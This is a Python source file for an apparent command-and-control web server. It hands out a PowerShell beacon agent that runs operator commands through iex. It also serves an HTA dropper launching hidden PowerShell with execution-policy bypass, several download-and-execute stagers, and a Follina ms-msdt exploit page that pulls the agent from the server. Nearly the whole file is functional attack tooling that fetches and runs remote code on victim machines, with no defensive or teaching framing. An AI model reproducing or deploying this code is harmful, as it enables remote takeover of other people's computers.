import http.server
import socketserver
import threading
import json
import base64

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """This server handles each request in a separate thread."""
    daemon_threads = True  # ensures threads exit when main thread does

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, request, client_address, server, client_manager, logger):
        self.client_manager = client_manager
        self.logger = logger
        super().__init__(request, client_address, server)

    def log_message(self, format, *args):
        self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def do_GET(self):
        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        if self.path == "/raw_agent":
            self.send_agent_response()
        elif self.path == "/hta_agent":
            self.send_hta_response()
        elif self.path == "/hjf_agent":
            self.send_hjf_response()
        elif self.path == "/hjfs_agent":
            self.send_hjfs_response()
        elif self.path == "/b64_stager":
            self.send_b64_stager_response()
        elif self.path == "/b52_stager":
            self.send_b52_stager_response()
        elif self.path == "/b52_agent":
            self.send_b52_agent_response()
        elif self.path == "/follina_url":
            self.send_follina_response()
        elif self.path == "/beacon":
          self.handle_beacon()
        else:
            # Send HTTP response status code
            self.send_response(200)
            # Send headers
            self.send_header("Content-type", "text/html")
            self.end_headers()
            # Prepare and send a simple HTML response
            message = "<html><body><h1>Welcome to the C2 Webserver!</h1></body></html>"
            self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self):
      client_id = self.client_address[0]
      self.logger(f"Beacon from {client_id}")
      self.client_manager.add_client(client_id)
      commands = self.client_manager.get_pending_commands(client_id)
      commands_json = json.dumps(commands)
      #send commands to the client
      self.send_response(200)
      self.send_header("Content-type", "application/json")
      self.end_headers()
      self.wfile.write(commands_json.encode("utf-8"))
      self.client_manager.clear_pending_commands(client_id)

    def send_agent_response(self):
        # Define the agent code
        agent_code = """
$client = New-Object System.Net.WebClient
$client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
while ($true) {
    try {
        $commands = $client.DownloadString("http://{ip}:{port}/beacon") | ConvertFrom-Json
        foreach ($command in $commands) {
            Write-Host "Executing command: $($command.command_type)"
            if ($command.command_type -eq "execute") {
                iex $command.args
            } elseif ($command.command_type -eq "upload") {
                # Implement upload logic here
                Write-Host "Upload command received, uploading: $($command.args)"
            }
        }
    } catch {
        Write-Host "Error: $_"
    }
    Start-Sleep -Seconds 5
}
"""
        agent_code = agent_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))
    def send_hta_response(self):
        hta_code = """
<script>
    new ActiveXObject("WScript.Shell").Run("powershell -w hidden -nop -ep bypass -c \\"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/raw_agent')\\"");
    window.close();
</script>
"""
        hta_code = hta_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(hta_code.encode("utf-8"))

    def send_hjf_response(self):
        hjf_code = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($s)
"""
        hjf_code = hjf_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(hjf_code.encode("utf-8"))
    
    def send_hjfs_response(self):
        hjfs_code = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($s)
"""
        hjfs_code = hjfs_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(hjfs_code.encode("utf-8"))
    
    def send_b64_stager_response(self):
        b64_stager = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($S)
"""
        b64_stager = b64_stager.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b64_stager.encode("utf-8"))

    def send_b52_stager_response(self):
        b52_stager = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/b52_agent');
IEX($S)
"""
        b52_stager = b52_stager.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b52_stager.encode("utf-8"))

    def send_b52_agent_response(self):
        b52_agent = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($S)
"""
        b52_agent = b52_agent.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b52_agent.encode("utf-8"))

    def send_follina_response(self):
        follina_code = """
<html>
<body>
    <script>
        window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"it_id=PCWDiagnostic&it_brokering=yes&it_option=7&it_cmd=iex(new-object net.webclient).downloadstring('http://{ip}:{port}/raw_agent')\\"";
    </script>
</body>
</html>
"""
        follina_code = follina_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(follina_code.encode("utf-8"))

def start_webserver(ip, port, client_manager, logger):
    server_address = (ip, int(port))
    try:
        # Pass the ClientManager instance to the handler
        handler = lambda request, client_address, server: C2RequestHandler(request, client_address, server, client_manager, logger)
        httpd = ThreadedHTTPServer(server_address, handler)
    except Exception as e:
        logger(f"Error starting webserver: {e}")
        return

    def serve():
        logger(f"Webserver running on {ip}:{port}")
        try:
            httpd.serve_forever()
        except Exception as e:
            logger(f"Webserver encountered an error: {e}")
        finally:
            httpd.server_close()
            logger("Webserver stopped.")

    server_thread = threading.Thread(target=serve, daemon=True)
    server_thread.start()
    return httpd
